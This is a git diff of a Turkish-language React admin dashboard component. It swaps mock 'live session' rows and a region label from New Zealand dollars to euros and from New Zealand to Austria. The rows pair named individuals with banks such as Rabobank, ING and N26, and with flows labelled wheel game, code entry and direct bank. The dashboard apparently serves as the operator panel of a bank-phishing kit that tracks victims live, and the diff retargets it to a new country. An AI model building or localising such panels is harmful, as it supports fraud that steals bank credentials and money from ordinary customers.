@@ -32,11 +32,11 @@ const overviewCards = [
 ] as const;
 
 const liveSessions = [
-  { name: "M. van Dijk", flow: "Çark Oyunu", bank: "Rabobank", status: "Canlı", value: "NZ$ 5,000", device: "iPhone 15" },
-  { name: "L. Jansen", flow: "Kod Girişi", bank: "ING", status: "Bekliyor", value: "NZ$ 2,500", device: "Galaxy S24" },
-  { name: "A. de Boer", flow: "Direkt Banka", bank: "ABN AMRO", status: "İncelemede", value: "NZ$ 3,500", device: "MacBook Air" },
-  { name: "S. Bakker", flow: "Çark Oyunu", bank: "bunq", status: "Canlı", value: "NZ$ 4,000", device: "iPad Pro" },
-  { name: "E. Visser", flow: "Tebrikler", bank: "N26", status: "Tamamlandı", value: "NZ$ 2,000", device: "Windows Edge" },
+  { name: "M. van Dijk", flow: "Çark Oyunu", bank: "Rabobank", status: "Canlı", value: "€ 5,000", device: "iPhone 15" },
+  { name: "L. Jansen", flow: "Kod Girişi", bank: "ING", status: "Bekliyor", value: "€ 2,500", device: "Galaxy S24" },
+  { name: "A. de Boer", flow: "Direkt Banka", bank: "ABN AMRO", status: "İncelemede", value: "€ 3,500", device: "MacBook Air" },
+  { name: "S. Bakker", flow: "Çark Oyunu", bank: "bunq", status: "Canlı", value: "€ 4,000", device: "iPad Pro" },
+  { name: "E. Visser", flow: "Tebrikler", bank: "N26", status: "Tamamlandı", value: "€ 2,000", device: "Windows Edge" },
 ] as const;
 
 const commandActions = [
@@ -162,7 +162,7 @@ export function AdminPreview() {
                       Sistem Stabil
                     </span>
                     <span className="rounded-full border border-white/10 bg-white/5 px-3 py-1 text-xs font-medium text-white/60">
-                      Yeni Zelanda • Premium Preview
+                      Avusturya • Premium Preview
                     </span>
                   </div>
                   <h2 className="mt-4 text-3xl font-semibold tracking-tight md:text-4xl">
